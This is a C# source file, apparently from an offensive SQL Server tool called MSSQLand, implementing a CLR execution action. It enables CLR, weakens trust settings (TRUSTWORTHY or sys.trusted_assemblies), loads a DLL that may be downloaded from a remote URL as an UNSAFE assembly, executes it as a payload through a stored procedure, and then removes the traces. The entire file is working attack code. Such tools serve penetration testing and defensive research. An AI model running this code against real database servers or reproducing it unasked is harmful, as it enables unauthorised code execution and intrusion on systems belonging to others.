using System;
using System.IO;
using System.Net;
using System.Security.Cryptography;
using MSSQLand.Utilities;
using MSSQLand.Services;

namespace MSSQLand.Actions.Execution
{
    internal class ClrExecution : BaseAction
    {
        private string _dllURI;
        private string _function;

        public override void ValidateArguments(string additionalArguments)
        {
            // Split the additional argument into parts (dll URI and function)
            string[] parts = SplitArguments(additionalArguments);

            if (parts.Length == 1)
            {
                _dllURI = parts[0].Trim();
                _function = "Main";
            }
            else if (parts.Length == 2)
            {
                _dllURI = parts[0].Trim();
                _function = parts[1].Trim();
            }

            else
            {
                throw new ArgumentException("Invalid arguments. CLR execution usage: dllURI function or dllURI");
            }

            if (string.IsNullOrEmpty(_dllURI))
            {
                throw new ArgumentException("The dllURI cannot be empty.");
            }
        }

        public override void Execute(DatabaseContext databaseContext)
        {
            // Step 1: Get the SHA-512 hash for the DLL and its bytes.
            string[] dllResult = ConvertDLLToSQLBytes(_dllURI);

            if (dllResult.Length != 2 || string.IsNullOrEmpty(dllResult[0]) || string.IsNullOrEmpty(dllResult[1]))
            {
                Logger.Error("Failed to convert DLL to SQL-compatible bytes.");
                return;
            }

            string dllHash = dllResult[0];
            string dllHexString = dllResult[1];

            Logger.Info($"SHA-512 Hash: {dllHash}");
            Logger.Info($"DLL Bytes Length: {dllHexString.Length}");

            // Step 2: Enable CLR if not already enabled.
            databaseContext.ConfigService.SetConfigurationOption("clr enabled", 1);

            // Step 3: Generate random names for assembly and trusted hash path.
            string dllPath = $"dll{Guid.NewGuid().ToString("N").Substring(0, 6)}";
            string assem = $"assem{Guid.NewGuid().ToString("N").Substring(0, 6)}";

            // Step 4: Handle legacy SQL servers.
            if (databaseContext.Server.Legacy)
            {
                Logger.Info("Turning on trustworthy property");
                databaseContext.QueryService.ExecuteNonProcessing($"ALTER DATABASE {databaseContext.Server.Database} SET TRUSTWORTHY ON;");
            }
            else
            {
                // Step 5: Check if the DLL hash already exists in sys.trusted_assemblies.
                string checkHash = databaseContext.QueryService.ExecuteScalar($"SELECT * FROM sys.trusted_assemblies WHERE hash = 0x{dllHash};")?.ToString().ToLower();

                if (checkHash?.Contains("permission was denied") == true)
                {
                    Logger.Error("Insufficient privileges to perform this action");
                    return;
                }

                if (checkHash?.Contains("system.byte[]") == true)
                {
                    Logger.Warning("Hash already exists in sys.trusted_assemblies");
                    string deletionQuery = databaseContext.QueryService.ExecuteScalar($"EXEC sp_drop_trusted_assembly 0x{dllHash};")?.ToString().ToLower();

                    if (deletionQuery?.Contains("permission was denied") == true)
                    {
                        Logger.Error("Insufficient privileges to remove existing trusted assembly");
                        return;
                    }

                    Logger.Success("Hash deleted");
                }

                // Step 6: Add the DLL hash into sys.trusted_assemblies.
                databaseContext.QueryService.ExecuteNonProcessing($@"
                    EXEC sp_add_trusted_assembly
                    0x{dllHash},
                    N'{dllPath}, version=0.0.0.0, culture=neutral, publickeytoken=null, processorarchitecture=msil';
                ");


                // Verify that the SHA-512 hash has been added.
                if (databaseContext.ConfigService.CheckTrustedAssembly(dllPath))
                {
                    Logger.Success($"Added hash 0x{dllHash} as trusted");
                }
                else
                {
                    Logger.Error("Unable to add hash to sys.trusted_assemblies");
                    return;
                }
            }

            
            string dropProcedure = $"DROP PROCEDURE IF EXISTS [{_function}];";
            string dropAssembly = $"DROP ASSEMBLY IF EXISTS [{assem}];";
            string dropClrHash = $"EXEC sp_drop_trusted_assembly 0x{dllHash};";

            // Step 7: Drop existing procedure and assembly if they exist.
            databaseContext.QueryService.ExecuteNonProcessing(dropProcedure);
            databaseContext.QueryService.ExecuteNonProcessing(dropAssembly);

            // Step 8: Create a new assembly from the DLL bytes.
            databaseContext.QueryService.ExecuteNonProcessing($"CREATE ASSEMBLY [{assem}] FROM 0x{dllHexString} WITH PERMISSION_SET = UNSAFE;");

            if (!databaseContext.ConfigService.CheckAssembly(assem))
            {
                Logger.Error("Failed to create a new assembly.");
                databaseContext.QueryService.ExecuteNonProcessing(dropAssembly);
                databaseContext.QueryService.ExecuteNonProcessing(dropClrHash);
                return;
            }

            Logger.Success($"DLL successfully loaded into assembly '{assem}'.");

            // Step 9: Create a new stored procedure linked to the assembly.
            databaseContext.QueryService.ExecuteNonProcessing($"CREATE PROCEDURE [dbo].[{_function}] AS EXTERNAL NAME [{assem}].[StoredProcedures].[{_function}];");

            if (!databaseContext.ConfigService.CheckProcedures(_function))
            {
                Logger.Error("Failed to load the DLL into a new stored procedure.");
                databaseContext.QueryService.ExecuteNonProcessing(dropProcedure);
                databaseContext.QueryService.ExecuteNonProcessing(dropAssembly);
                databaseContext.QueryService.ExecuteNonProcessing(dropClrHash);
                return;
            }

            Logger.Success($"Stored procedure '{_function}' created successfully.");

            // Step 10: Execute the payload
            Logger.Task("Executing payload");
            Console.WriteLine(databaseContext.QueryService.ExecuteScalar($"EXEC {_function};"));

            // Step 11: Cleanup - Drop procedure, assembly, and trusted hash.
            databaseContext.QueryService.ExecuteNonProcessing(dropProcedure);
            databaseContext.QueryService.ExecuteNonProcessing(dropAssembly);
            databaseContext.QueryService.ExecuteNonProcessing(dropClrHash);

            // Step 12: Reset TRUSTWORTHY property for legacy servers.
            if (databaseContext.Server.Legacy)
            {
                Logger.Info("Turning off trustworthy property");
                databaseContext.QueryService.ExecuteNonProcessing($"ALTER DATABASE {databaseContext.Server.Database} SET TRUSTWORTHY OFF;");
            }

            Logger.Success("Execution and cleanup completed.");
        }


        /// <summary>
        /// Take a .NET assembly on disk and cnovert it
        /// to SQL compatible byte format for storage in a stored procedure.
        /// </summary>
        /// <param name="dll"></param>
        /// <returns></returns>
        private static string[] ConvertDLLToSQLBytesFile(string dll)
        {
            string[] dllArr = new string[2];
            string dllHash = "";
            string dllBytes = "";

            // Read the DLL, create an SHA-512 hash for it and convert the DLL to SQL compatible bytes.
            try
            {
                FileInfo fileInfo = new(dll);
                Logger.Info($"{dll} is {fileInfo.Length} bytes.");

                // Get the SHA-512 hash of the DLL, so we can use sp_add_trusted_assembly to add it as a trusted DLL on the SQL server.
                using (SHA512 sha512 = SHA512.Create())
                {
                    using FileStream fileStream = File.OpenRead(dll);
                    foreach (byte hash in sha512.ComputeHash(fileStream))
                    {
                        dllHash += hash.ToString("x2");
                    }
                }

                // Read the local dll as bytes and store into the dllBytes variable, otherwise, the DLL will need to be on the SQL server.
                foreach (Byte b in File.ReadAllBytes(dll))
                {
                    dllBytes += b.ToString("X2");
                }

            }
            catch (FileNotFoundException)
            {
                Logger.Error($"Unable to load {dll}");
            }

            dllArr[0] = dllHash;
            dllArr[1] = dllBytes;
            return dllArr;
        }

        /// <summary>
        /// The _convertDLLToSQLByteWeb method will download a .NET assembly from a remote HTTP/s
        /// location and covert it to SQL compatible byte format for storage in a stored procedure.
        /// </summary>
        /// <param name="dll"></param>
        /// <returns></returns>
        private static string[] ConvertDLLToSQLBytesWeb(string dll)
        {
            string[] dllArr = new string[2];
            string dllHash = "";
            string dllBytes = "";

            try
            {
                // Get the SHA-512 hash of the DLL, so we can use sp_add_trusted_assembly to add it as a trusted DLL on the SQL server.
                using SHA512 sha512 = SHA512.Create();
                using WebClient client = new WebClient();
                ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12;
                Logger.Info($"Downloading DLL from {dll}");

                byte[] content = client.DownloadData(dll);

                using MemoryStream stream = new MemoryStream(content);
                BinaryReader reader = new BinaryReader(stream);
                byte[] dllByteArray = reader.ReadBytes(Convert.ToInt32(stream.Length));
                stream.Close();
                reader.Close();

                Logger.Info($"DLL is {dllByteArray.Length} bytes");

                foreach (var hash in sha512.ComputeHash(dllByteArray))
                {
                    dllHash += hash.ToString("x2");
                }
                // Read the local dll as bytes and store into the dllBytes variable, otherwise, the DLL will need to be on the SQL server.
                foreach (Byte b in dllByteArray)
                {
                    dllBytes += b.ToString("X2");
                }
            }
            catch (Exception ex)
            {
                Logger.Error($"Unable to download DLL from {ex}");
            }

            dllArr[0] = dllHash;
            dllArr[1] = dllBytes;
            return dllArr;
        }

        /// <summary>
        /// This method determines if the .NET assembly resides locally
        /// on disk, or remotely on a web server.
        /// </summary>
        /// <param name="dll"></param>
        /// <returns></returns>
        private static string[] ConvertDLLToSQLBytes(string dll)
        {
            string[] dllArr = dll.ToLower().Contains("http://") || dll.ToLower().Contains("https://")
            ? ConvertDLLToSQLBytesWeb(dll)
            : ConvertDLLToSQLBytesFile(dll);

            return dllArr;
        }
    }
}
